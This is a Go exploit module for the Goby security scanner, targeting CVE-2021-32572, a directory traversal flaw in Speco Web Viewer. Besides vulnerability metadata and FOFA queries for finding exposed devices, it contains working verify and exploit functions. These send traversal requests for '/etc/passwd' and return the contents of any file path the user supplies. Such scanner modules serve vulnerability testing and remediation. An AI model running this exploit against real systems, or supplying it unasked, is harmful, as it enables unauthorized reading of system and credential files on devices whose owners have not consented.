package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "Speco Web Viewer Directory Traversal (CVE-2021-32572)",
    "Description": "<p>Speco Technologies Speco Web Viewer is a network device of Speco Technologies in the United States. A channel web server.</p><p>The vulnerability allows an attacker to traverse a directory starting with a URI through a GET request to obtain sensitive server information.</p>",
    "Impact": "<p>Speco Web Viewer Directory Traversal (CVE-2021-32572)</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.specotech.com/\">https://www.specotech.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Speco Web Viewer",
    "VulType": [
        "Directory Traversal"
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "Translation": {
        "CN": {
            "Name": "Speco Web Viewer 路径遍历漏洞 (CVE-2021-32572)",
            "Product": "Speco Web Viewer",
            "Description": "<p>Speco Technologies Speco Web Viewer是美国Speco Technologies公司的一个网络设备。一个通道网络服务器。</p><p>漏洞允许攻击者通过GET请求以URI开头进行目录遍历，获取服务器敏感信息。</p>",
            "Recommendation": "<p>厂商暂未提供修复方案，请关注厂商网站及时更新: <a href=\"https://www.specotech.com/\">https://www.specotech.com/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>漏洞允许攻击者通过GET请求以URI开头进行目录遍历，获取服务器敏感信息。</p>",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "Speco Web Viewer Directory Traversal (CVE-2021-32572)",
            "Product": "Speco Web Viewer",
            "Description": "<p>Speco Technologies Speco Web Viewer is a network device of Speco Technologies in the United States. A channel web server.</p><p>The vulnerability allows an attacker to traverse a directory starting with a URI through a GET request to obtain sensitive server information.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.specotech.com/\">https://www.specotech.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Speco Web Viewer Directory Traversal (CVE-2021-32572)</p>",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "FofaQuery": "title==\"Web Client\" && (body=\"what is the speco library plugin\"|| body=\"ocx.ShowClientConfig()\")",
    "GobyQuery": "title==\"Web Client\" && (body=\"what is the speco library plugin\"|| body=\"ocx.ShowClientConfig()\")",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.specotech.com/",
    "DisclosureDate": "2022-02-21",
    "References": [
        "https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=5438"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "6.0",
    "CVEIDs": [
        "CVE-2021-32572"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202105-780"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "../../../../../../../../../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10260"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/../../../../../../../../../../../../etc/passwd"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				return resp1.StatusCode == 200 && regexp.MustCompile("root:(.*?):0:0:").MatchString(resp1.RawBody)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/" + cmd
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
